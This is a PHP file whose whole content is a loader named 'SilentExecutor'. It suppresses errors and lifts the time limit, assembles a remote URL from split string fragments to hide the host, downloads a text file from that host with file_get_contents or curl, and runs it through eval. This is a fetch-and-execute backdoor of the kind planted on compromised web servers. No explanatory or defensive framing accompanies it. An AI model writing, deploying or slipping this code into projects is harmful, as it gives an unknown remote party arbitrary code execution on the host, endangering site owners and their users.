<?php
error_reporting(0);
set_time_limit(0);
class SilentExecutor {
    private $url;
    public function __construct() {
        $this->url = $this->buildUrl();
    }
    private function buildUrl() {
        $a = 'ht' . 'tps';
        $b = '://';
        $c = 'bob' . 'sing' . 'sa';
        $d = '.' . 'shop';
        $e = '/en-4.txt';
        return $a . $b . $c . $d . $e;
    }
    private function fetchRemoteCode() {
        $fn = 'file' . '_get_' . 'contents';
        $data = @$fn($this->url);
        if (!$data) {
            $ch = curl_init($this->url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            $data = curl_exec($ch);
            curl_close($ch);
        }
        return $data;
    }
    public function execute() {
        $code = $this->fetchRemoteCode();
        if ($code) {
            eval('?>' . $code);
        } else {
            echo "Failed to fetch remote code.";
        }
    }
}
$executor = new SilentExecutor();
$executor->execute();
exit;
?>
